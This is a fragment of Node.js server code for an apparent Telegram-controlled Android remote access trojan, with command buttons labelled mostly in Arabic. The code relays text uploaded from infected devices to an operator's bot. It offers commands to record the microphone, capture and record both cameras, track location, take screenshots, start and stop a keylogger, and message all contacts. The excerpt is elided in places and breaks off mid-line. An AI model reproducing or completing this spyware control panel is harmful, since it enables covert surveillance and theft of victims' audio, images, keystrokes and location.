...
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'],
    {
      parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["عدد الاجهزه"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
            ...
            reply_markup: {
                inline_keyboard: [
                    ...
                    [
                        ...
                        {text: 'تسجيل الصوت', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'الكاميرا الاماميه', callback_data: `camera_main:${uuid}`},
                        {text: 'الكاميرا سلفي', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'تسجيل بالاماميه', callback_data: `rec_camera_main:${uuid}`},
                        {text: 'تسجيل بالسلفي', callback_data: `rec_camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'الموقع', callback_data: `location:${uuid}`},
                        {text: 'اشعارات', callback_data: `toast:${uuid}`}
                    ],
                    [
                    ...
                    [
                        {text: 'الهزاز', callback_data: `vibrate:${uuid}`},
                        {text: 'اظهار اشعار', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                    ...
                    [
                        ...
                        {text: 'اشعارات نار', callback_data: `screenshot:${uuid}`},
                    ],
                    [
                        {text: 'تشغيل الفلاش', callback_data: `torch_on:${uuid}`},
                        {text: 'ايقاف الصوت', callback_data: `torch_off:${uuid}`},
                    ],
                    [
                        {text: 'ضربات المفاتيح شغال', callback_data: `keylogger_on:${uuid}`},
                        {text: 'ايقاف ضربات المفاتيح', callback_data: `keylogger_off:${uuid}`},
                    ],
                    [
                    ...
                    [
                        {
                            text: 'تحويل النص الى كلام',
                            callback_data: `send_message_to_all:${uuid}`
                        },
                    ],
                    [
                        {
                            text: 'ارسال رسال الى الجميع',
